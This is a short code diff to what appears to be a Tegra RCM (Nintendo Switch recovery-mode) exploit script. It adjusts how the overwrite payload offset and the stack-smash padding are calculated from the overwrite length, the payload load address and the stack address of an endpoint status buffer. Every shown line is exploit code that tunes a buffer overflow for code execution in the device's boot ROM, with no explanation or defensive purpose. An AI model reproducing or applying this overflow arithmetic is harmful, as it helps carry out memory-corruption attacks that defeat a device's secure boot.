@@ -623,7 +623,9 @@ class RCMHax:
 
     def get_overwite_payload_off(self, intermezzo_size):
         overwrite_len = self.get_overwrite_length()
-        return overwrite_len - 4 - intermezzo_size
+        overall_payload_overwrite_len = overwrite_len - (RCM_PAYLOAD_ADDR - self.EndpointStatus_stack_addr)
+        overwrite_payload_off = overall_payload_overwrite_len - intermezzo_size - 4
+        return overwrite_payload_off
 
     def get_payload_first_length(self, intermezzo_size, payload_length):
         overwrite_payload_off = self.get_overwite_payload_off(intermezzo_size)
@@ -753,11 +755,11 @@ print("overwrite_len: 0x{:08x}".format(overwrite_len))
 payload_overwrite_len = overwrite_len - (RCM_PAYLOAD_ADDR - switch.EndpointStatus_stack_addr)
 print("payload_overwrite_len: 0x{:08x}".format(payload_overwrite_len))
 
-overwrite_payload_off = payload_overwrite_len - intermezzo_size
+overwrite_payload_off = switch.get_overwite_payload_off(intermezzo_size)
 print("overwrite_payload_off: 0x{:08x}".format(overwrite_payload_off))
 smash_padding = 0
 if payload_first_length < overwrite_payload_off:
-    smash_padding = overwrite_payload_off - payload_first_length - 4
+    smash_padding = overwrite_payload_off - payload_first_length
 print("smash_padding: 0x{:08x}".format(smash_padding))
 payload += b'\0' * smash_padding
 
